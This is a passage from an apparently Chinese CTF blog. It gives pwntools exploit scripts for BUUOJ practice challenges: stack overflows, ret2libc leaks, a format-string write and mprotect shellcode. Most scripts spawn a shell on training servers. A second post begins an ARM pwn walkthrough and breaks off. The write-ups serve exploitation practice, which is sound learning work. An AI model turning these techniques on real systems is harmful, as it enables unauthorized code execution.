class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">	<span class="built_in">fgets</span>(info, <span class="number">32</span>, stdin);</span><br><span class="line">	input = info;</span><br><span class="line">	string you = <span class="string">&quot;you&quot;</span>;</span><br><span class="line">	string I = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">	rep = <span class="built_in">replace</span>(input, you, I);	<span class="comment">// replace &quot;I&quot; with &quot;you&quot;</span></span><br><span class="line">	<span class="built_in">strcpy</span>(info, rep.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">vuln</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的功能是将info中所有的&quot;I&quot;换成&quot;you&quot;，replace函数甚至都无需分析。由此很容易看出这里有潜在的溢出问题。而且程序本身也给了后门，因此直接修改返回地址即可。<br />
exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu006-jarvisoj_level0"><a class="markdownIt-Anchor" href="#buu006-jarvisoj_level0"></a> buu006-jarvisoj_level0</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26344</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World&#x27;</span>, cyclic(<span class="number">128</span>+<span class="number">8</span>) + p64(<span class="number">0x400596</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu007-ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#buu007-ciscn_2019_c_1"></a> buu007-ciscn_2019_c_1</h1>
<p>常规的获取got表地址，LibcSearcher有的时候可以有的时候不行，题目能给libc是最好的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25958</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)	<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu008-第五空间2019-决赛pwn5"><a class="markdownIt-Anchor" href="#buu008-第五空间2019-决赛pwn5"></a> buu008-[第五空间2019 决赛]PWN5</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28577</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu009-ciscn_2019_n_8"><a class="markdownIt-Anchor" href="#buu009-ciscn_2019_n_8"></a> buu009-ciscn_2019_n_8</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26497</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, cyclic(<span class="number">4</span> * <span class="number">13</span>) + p32(<span class="number">17</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu010-jarvisoj_level2"><a class="markdownIt-Anchor" href="#buu010-jarvisoj_level2"></a> buu010-jarvisoj_level2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29788</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(binsh_addr) + p32(binsh_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu011-ogeek2019babyrop"><a class="markdownIt-Anchor" href="#buu011-ogeek2019babyrop"></a> buu011-[OGeek2019]babyrop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27628</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">exp = <span class="number">0x8048825</span></span><br><span class="line">ret = <span class="number">0x8048502</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(exp)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu012-bjdctf_2020_babystack"><a class="markdownIt-Anchor" href="#buu012-bjdctf_2020_babystack"></a> buu012-bjdctf_2020_babystack</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27538</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;length of your name:&#x27;</span>, <span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">0x10</span> + <span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu013-get_started_3dsctf_2016"><a class="markdownIt-Anchor" href="#buu013-get_started_3dsctf_2016"></a> buu013-get_started_3dsctf_2016</h1>
<p>不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 <s>（屑）</s><br />
使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。<br />
<img src="https://img-blog.csdnimg.cn/b6188cbaf1d841cba169b5a8872f551b.png" alt="" /><br />
exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">start = <span class="number">0x80eb000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">bss = <span class="number">0x803bf80</span></span><br><span class="line">pop3 = <span class="number">0x0809e4c5</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(length)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(<span class="number">0</span>)	<span class="comment"># stdin</span></span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(start)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu014-ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#buu014-ciscn_2019_en_2"></a> buu014-ciscn_2019_en_2</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25743</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)	<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu015-harekazectf2019baby_rop"><a class="markdownIt-Anchor" href="#buu015-harekazectf2019baby_rop"></a> buu015-[HarekazeCTF2019]baby_rop</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28394</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x600a90</span></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu016-jarvisoj_level2_x64"><a class="markdownIt-Anchor" href="#buu016-jarvisoj_level2_x64"></a> buu016-jarvisoj_level2_x64</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25723</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400683</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, cyclic(<span class="number">0x18</span>) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">ARM pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:17 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:17+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><font face=汉仪唐美人>上一篇文章中笔者对ARM架构的寄存器和指令集做了简单的介绍，本文就来首杀ARM pwn题。</font></p>
<h1 id="font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"><a class="markdownIt-Anchor" href="#font-size6-face汉仪唐美人buuoj-第139题-jarvisoj_typofont"></a> <font size=6, face=汉仪唐美人><strong>buuoj 第139题 jarvisoj_typo</strong></font></h1>
<p><font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用<code>qemu-arm ...</code>来执行。</font></p>
<p><font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font></p>
<p><img src="https://img-blog.csdnimg.cn/e72c9ff3e6af490fb3e9fb5bf85b2243.png" alt="" /></p>
<p><font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font></p>
<p><img src="https://img-blog.csdnimg.cn/e996f980ef9941099fbbc372fc7f5200.png" alt="" /></p>
<p><font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font></p>
<p><img src="https://img-blog.csdnimg.cn/7dd8665411a44b65bdaaabdb115b85f9.png" alt="" /></p>
<p><font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font></p>
<p><img src="https://img-blog.csdnimg.cn/f8ca296275374151a59ee4f3e6e18e53.png" alt="" /></p>
<p><font face=汉仪唐美人>这里可以推测<code>sub_8D24</code>是关键输入函数。</font></p>
<p><img src="https://img-blog.csdnimg.cn/cfd778369edd4f21acb4674afbdfeffb.png" alt="" /></p>
<p><font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过<code>gdb-multiarch</code>进行调试。经过调试发现上图中的<code>read</code>函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font></p>
<p><img src="https://img-blog.csdnimg.cn/bcfa376ecf864b53bb35c6aff0a411bf.png" alt="" /></p>
<p><font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串<code>/bin/sh</code>:</font></p>
<p><img src="https://img-blog.csdnimg.cn/c1cd7531800d4bbeb88e75c98d414543.png" alt="" /></p>
